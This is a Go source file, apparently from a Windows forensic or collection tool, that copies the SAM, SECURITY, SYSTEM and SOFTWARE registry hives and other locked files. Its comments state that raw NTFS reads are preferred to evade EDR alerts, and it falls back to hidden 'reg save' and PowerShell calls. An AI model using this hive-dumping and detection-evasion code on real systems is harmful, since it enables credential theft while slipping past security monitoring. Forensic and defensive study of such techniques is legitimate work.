//go:build windows

package engine

import (
	"bytes"
	"fmt"
	"io"
	"os/exec"
	"strings"
	"syscall"

	"gtrace/internal/ntfs"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

func performRegSave(hiveKey, outFile string) error {
	// Strategy Update: Prioritize Raw NTFS (go-ntfs) for stealth.
	// 'reg save' triggers EDR alerts and creates process noise.
	// NTFS parsing is purely read-only on disk and much quieter.

	// 1. Try Raw NTFS First
	var path string
	switch {
	case strings.Contains(hiveKey, "SYSTEM"):
		path = `C:\Windows\System32\config\SYSTEM`
	case strings.Contains(hiveKey, "SOFTWARE"):
		path = `C:\Windows\System32\config\SOFTWARE`
	case strings.Contains(hiveKey, "SAM"):
		path = `C:\Windows\System32\config\SAM`
	case strings.Contains(hiveKey, "SECURITY"):
		path = `C:\Windows\System32\config\SECURITY`
	}

	// If we mapped the path successfully, try NTFS
	var errNTFS error
	if path != "" {
		errNTFS = ntfs.CopyLockedFile(path, outFile)
		if errNTFS == nil {
			// Success! Stealthy return.
			return nil
		}
		// If NTFS fails, log vaguely and proceed to noisy fallback
		// fmt.Printf("NTFS Fallback debug: %v\n", errNTFS)
	}

	// 2. Fallback: Noisy 'reg save'
	// Go automatically handles quoting for paths with spaces in exec.Command
	cmd := exec.Command("reg", "save", hiveKey, outFile, "/y")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.CombinedOutput()
	if err == nil {
		return nil
	}

	// First attempt failed.
	utf8Out, _ := gbkToUtf8(out)
	firstErr := fmt.Errorf("reg save '%s' failed: %v, out: %s", hiveKey, err, utf8Out)

	// 3. Last Resort: PowerShell
	// powershell -NoProfile -WindowStyle Hidden -Command "Reg Save HKLM\SYSTEM 'path' /y"
	psCmd := fmt.Sprintf("reg save %s '%s' /y", hiveKey, outFile)
	cmdPS := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCmd)
	cmdPS.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	outPS, errPS := cmdPS.CombinedOutput()
	if errPS == nil {
		return nil
	}
	utf8OutPS, _ := gbkToUtf8(outPS)

	return fmt.Errorf("All methods failed. NTFS: %v. Reg: %v. PS: %s", errNTFS, firstErr, utf8OutPS)
}

func gbkToUtf8(s []byte) (string, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, err := io.ReadAll(reader)
	if err != nil {
		return string(s), err
	}
	return string(d), nil
}

func copyLockedFile(src, dst string) error {
	// Strategy Update: Prioritize Raw NTFS (go-ntfs) for stealth.
	// This helps avoiding "Access Denied" on locked EventLogs and Prefetch.

	// 1. Try Raw NTFS First
	if errNTFS := ntfs.CopyLockedFile(src, dst); errNTFS == nil {
		return nil
	}

	// 2. Fallback to cmd.exe
	// Attempt to copy a locked file using cmd.exe /c copy /b
	// The /b flag is for binary.
	// We use cmd.exe because it's more direct than PowerShell for simple copies
	// and often behaves differently with locks.
	cmd := exec.Command("cmd", "/c", "copy", "/y", "/b", src, dst)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err := cmd.Run()
	if err == nil {
		return nil
	}

	return fmt.Errorf("copy failed: ntfs failed, cmd=%v", err)
}
